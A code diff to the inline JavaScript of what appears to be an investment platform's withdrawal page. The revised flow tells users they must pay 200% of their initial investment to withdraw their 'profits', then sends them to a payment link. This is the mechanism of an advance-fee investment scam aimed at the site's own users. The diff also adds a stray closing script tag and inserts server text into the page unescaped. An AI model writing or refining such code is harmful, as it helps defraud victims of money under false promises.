@@ -46,127 +46,71 @@
             <button class="withdraw-button" onclick="attemptWithdraw()"><i class="fas fa-money-check-alt"></i>
                 Withdraw</button>
                 <script>
-                    async function attemptWithdraw() {
-                            const modal = new bootstrap.Modal(document.getElementById('withdrawalModal'));
-                            const modalBody = document.getElementById('withdrawalModalBody');
-                            const proceedBtn = document.getElementById('proceedWithdrawalBtn');
+                   async function attemptWithdraw() {
+                        const modal = new bootstrap.Modal(document.getElementById('withdrawalModal'));
+                        const modalBody = document.getElementById('withdrawalModalBody');
+                        const proceedBtn = document.getElementById('proceedWithdrawalBtn');
 
-                            try {
-                                // Show loading state with animation
-                                modalBody.innerHTML = `
-            <div class="text-center py-4">
-                <div class="spinner-border text-primary mb-3" role="status">
-                    <span class="visually-hidden">Loading...</span>
-                </div>
-                <h5 class="mt-3">Checking withdrawal eligibility...</h5>
-                <p class="text-muted">This may take a moment</p>
+                        try {
+                            // Show loading state
+                            modalBody.innerHTML = `<div class="text-center py-4">
+            <div class="spinner-border text-primary mb-3" role="status">
+                <span class="visually-hidden">Loading...</span>
             </div>
-        `;
-                                modal.show();
+            <h5 class="mt-3">Checking withdrawal eligibility...</h5>
+        </div>`;
+                            modal.show();
 
-                                const response = await fetch("/check_withdrawal", {
+                            const response = await fetch("/check_withdrawal", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" }
+                            });
+                            const result = await response.json();
+
+                            if (result.error) {
+                                modalBody.innerHTML = `<div class="alert alert-danger">${result.error}</div>`;
+                                proceedBtn.style.display = 'none';
+                                return;
+                            }
+
+                            if (!result.can_withdraw) {
+                                modalBody.innerHTML = `<div class="alert alert-warning">${result.message}</div>`;
+                                proceedBtn.style.display = 'none';
+                                return;
+                            }
+
+                            // Show withdrawal confirmation
+                            modalBody.innerHTML = `<div class="text-center">
+            <h4>Withdrawal Available!</h4>
+            <p>To withdraw your profits, you need to pay 200% of your initial investment.</p>
+            <p><strong>Amount to Pay:</strong> $${result.required_payment.toFixed(2)}</p>
+        </div>`;
+
+                            proceedBtn.style.display = 'inline-block';
+                            proceedBtn.onclick = async () => {
+                                proceedBtn.disabled = true;
+                                proceedBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span> Processing...';
+
+                                const paymentResponse = await fetch("/process_withdrawal", {
                                     method: "POST",
                                     headers: { "Content-Type": "application/json" }
                                 });
+                                const paymentData = await paymentResponse.json();
 
-                                const result = await response.json();
-
-                                if (result.error) {
-                                    modalBody.innerHTML = `
-                <div class="alert alert-danger">
-                    <i class="fas fa-exclamation-circle me-2"></i>
-                    <strong>Error:</strong> ${result.error}
-                </div>
-            `;
-                                    proceedBtn.style.display = 'none';
-                                    return;
+                                if (paymentData.status) {
+                                    window.location.href = paymentData.data.authorization_url;
+                                } else {
+                                    modalBody.innerHTML += `<div class="alert alert-danger mt-3">${paymentData.message}</div>`;
+                                    proceedBtn.disabled = false;
+                                    proceedBtn.innerHTML = 'Try Again';
                                 }
-
-                                if (!result.can_withdraw) {
-                                    modalBody.innerHTML = `
-                <div class="alert alert-warning">
-                    <i class="fas fa-clock me-2"></i>
-                    <strong>Pending:</strong> ${result.message}
-                </div>
-                <div class="text-center mt-3">
-                    <i class="fas fa-hourglass-half fa-2x text-warning"></i>
-                </div>
-            `;
-                                    proceedBtn.style.display = 'none';
-                                    return;
-                                }
-
-                                // Success state with animation
-                                modalBody.innerHTML = `
-            <div class="text-center">
-                <div class="checkmark"></div>
-                <h4 class="text-success mt-3">Ready to Withdraw!</h4>
-                <div class="payment-details mt-4">
-                    <p><strong>Amount to Pay:</strong> $${result.required_payment.toFixed(2)}</p>
-                    <p class="text-muted">This payment will unlock your profits</p>
-                </div>
-            </div>
-        `;
-
-                                proceedBtn.style.display = 'inline-block';
-                                proceedBtn.innerHTML = '<i class="fas fa-lock-open me-2"></i> Unlock Withdrawal';
-
-                                proceedBtn.onclick = async () => {
-                                    proceedBtn.disabled = true;
-                                    proceedBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2" role="status"></span> Processing...';
-
-                                    try {
-                                        const paymentResponse = await fetch("/process_withdrawal", {
-                                            method: "POST",
-                                            headers: { "Content-Type": "application/json" }
-                                        });
-
-                                        const paymentData = await paymentResponse.json();
-
-                                        if (paymentData.status) {
-                                            modalBody.innerHTML = `
-                        <div class="text-center">
-                            <i class="fas fa-check-circle text-success fa-4x mb-3"></i>
-                            <h4>Redirecting to Payment...</h4>
-                            <p>Please complete your payment to withdraw</p>
-                        </div>
-                    `;
-                                            setTimeout(() => {
-                                                window.location.href = paymentData.data.authorization_url;
-                                            }, 1500);
-                                        } else {
-                                            modalBody.innerHTML = `
-                        <div class="alert alert-danger">
-                            <i class="fas fa-times-circle me-2"></i>
-                            <strong>Payment Failed:</strong> ${paymentData.message || "Please try again later"}
-                        </div>
-                    `;
-                                            proceedBtn.style.display = 'none';
-                                        }
-                                    } catch (error) {
-                                        modalBody.innerHTML = `
-                    <div class="alert alert-danger">
-                        <i class="fas fa-exclamation-triangle me-2"></i>
-                        <strong>Error:</strong> ${error.message}
-                    </div>
-                `;
-                                    } finally {
-                                        proceedBtn.disabled = false;
-                                        proceedBtn.innerHTML = '<i class="fas fa-lock-open me-2"></i> Try Again';
-                                    }
-                                };
-
-                            } catch (error) {
-                                modalBody.innerHTML = `
-            <div class="alert alert-danger">
-                <i class="fas fa-bug me-2"></i>
-                <strong>System Error:</strong> ${error.message}
-            </div>
-        `;
-                                proceedBtn.style.display = 'none';
-                            }
+                            };
+                        } catch (error) {
+                            modalBody.innerHTML = `<div class="alert alert-danger">Error: ${error.message}</div>`;
+                            proceedBtn.style.display = 'none';
                         }
-                       </script>
+                    } 
+                </script>
         </div>
 
         <!-- Help Icon -->
@@ -231,6 +175,7 @@
                     </li>
                 </ul>
             </div>
+            </script>
         </div>
 
         <!-- Currency Converter -->
